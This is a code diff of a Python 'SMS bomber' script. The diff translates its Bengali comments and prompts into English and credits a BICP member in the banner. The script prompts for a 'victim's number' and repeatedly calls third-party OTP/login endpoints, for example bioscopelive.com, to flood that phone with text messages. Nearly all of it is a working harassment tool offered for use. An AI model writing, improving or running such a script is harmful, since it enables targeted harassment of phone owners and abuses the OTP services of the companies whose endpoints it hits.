@@ -2,7 +2,7 @@ import requests
 import os
 import time
 
-# লোগো
+# Logo
 os.system("clear")
 logo = """
 ██████╗ ██████╗ ██████╗ 
@@ -11,15 +11,15 @@ logo = """
 ██║  ██║██╔═══╝ ██╔═══╝ 
 ██████╔╝██║     ██║     
 ╚═════╝ ╚═╝     ╚═╝     
-BICP - SMS BOMBER
+Ifshita Arohi Junior Member of BICP- SMS BOMBER
 """
 print(logo)
 
-# ইউজার ইনপুট
-number = input("📱 ভুক্তভোগীর নাম্বার লিখুন (WITHOUT +880): ")
-total_sms = int(input("✉️ এসএমএস সংখ্যা লিখুন: "))
+# User Input
+number = input("📱 Enter the victim's number (WITHOUT +880): ")
+total_sms = int(input("✉️ Enter the number of SMS to send: "))
 
-# API তালিকা
+# API List
 apis = [
     {
         "url": f"https://www.bioscopelive.com/en/login/send-otp?phone=880{number}&operator=bd-otp",
@@ -38,9 +38,9 @@ apis = [
     },
 ]
 
-# এসএমএস পাঠানো শুরু
+# Start sending SMS
 count = 0
-print("\n📡 এসএমএস পাঠানো শুরু হচ্ছে...")
+print("\n📡 Sending SMS...")
 for i in range(total_sms):
     for api in apis:
         try:
@@ -51,11 +51,11 @@ for i in range(total_sms):
             
             if response.status_code == 200:
                 count += 1
-                print(f"✅ {count}/{total_sms} এসএমএস সফলভাবে পাঠানো হয়েছে!")
+                print(f"✅ {count}/{total_sms} SMS sent successfully!")
             else:
-                print(f"❌ এসএমএস পাঠানো ব্যর্থ: {response.status_code}")
+                print(f"❌ Failed to send SMS: {response.status_code}")
         except Exception as e:
-            print(f"⚠️ ত্রুটি: {e}")
-        time.sleep(1)  # প্রতিটি এসএমএসের মাঝে সময় বিরতি
+            print(f"⚠️ Error: {e}")
+        time.sleep(1)  # Time delay between SMS
 
-print("\n🎉 কাজ শেষ! সব এসএমএস পাঠানো হয়েছে।")
+print("\n🎉 Task completed! All SMS have been sent.")
